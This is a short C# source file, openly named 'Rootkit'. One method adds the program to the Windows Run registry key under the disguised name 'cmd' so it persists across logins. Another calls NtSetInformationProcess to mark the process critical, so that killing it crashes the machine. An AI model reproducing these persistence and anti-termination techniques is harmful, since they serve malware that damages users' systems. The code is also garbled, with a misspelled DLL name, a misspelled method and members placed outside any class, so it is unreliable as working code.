using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Windows.Forms;
public static void AutoRun()
	{
		RegistryKey rsk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
		rsk.SetValue("cmd", Application.ExecutablePath);
	}
namespace Rootkit
{
	[DllImport("ntd.dll", SetLastError = true)]

	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static bool GetRootkit()
	{
		try
		{
			Process.EnterDebudMode();
			int iIsCritical = -1;
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));

			return true;
		}
		catch { return false; }
	}
}
